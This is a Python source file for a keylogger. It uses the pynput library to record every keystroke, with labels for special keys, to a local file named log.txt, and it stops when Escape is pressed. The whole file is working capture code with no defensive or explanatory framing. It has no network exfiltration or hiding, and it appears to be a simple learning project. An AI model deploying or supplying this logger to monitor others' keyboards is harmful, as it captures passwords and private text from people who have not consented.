import string, pynput
from pynput.keyboard import Key, Listener

# File to log the keys
log_file = "log.txt"

# Used to write whatever keys are pressed to a
# file in the current directory, log.txt
def write_to_file(key: string):
    """
    Write the key after they are pressed.

    Args:
        key (string): The key that was pressed down.
    """
    with open(log_file, "a") as file:
        key_data = str(key).replace("'", "")
        if key == Key.space:
            file.write(' ')
        elif key == Key.enter:
            file.write('\n')
        elif key == Key.backspace:
            file.write(" [BACKSPACE] ")
        elif key == Key.caps_lock:
            file.write(" [CAPSLOCK] ")
        elif key == Key.tab:
            file.write(" [TAB] ")
        elif key == Key.shift:
            file.write(" [SHIFT] ")
        elif key == Key.esc:
            file.write(" [ESC] ")
        else:
            file.write(key_data)

def clear_file():
    with open(log_file, "w") as file:
        file.write("Keylogger started...\n\n")

# Called when a key is pressed
def on_press(key: string):
    """
    Called when a key is pressed while the listener is running.

    Args:
        key (string): The key that was pressed.

    The function writes the pressed key to a log file and prints 
    a confirmation message to the console for debug purposes.
    """
    write_to_file(key)
    # print('Wrote', key, 'to', log_file, '.')

# Called when a key is released
def on_release(key: string):
    """
    Called when a key is released while the listener is running.

    Args:
        key (string): The key that was released.

    The function's purpose is to return False to close the program 
    when "Escape" is released.
    """
    if key == Key.esc:
        print('Escape pressed.')
        return False # If ret is false the program will close

# Main function to start the keylogger
def start():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        """
        The key presses and releases trigger specific callback functions. 
            The listener runs in the background and monitors the keyboard events for input.

        Args:
            on_press (function): A callback function that is called when a key is pressed.
            on_release (function): A callback function that is called when a key is released.
        """
        listener.join()

if __name__ == "__main__":
    start()
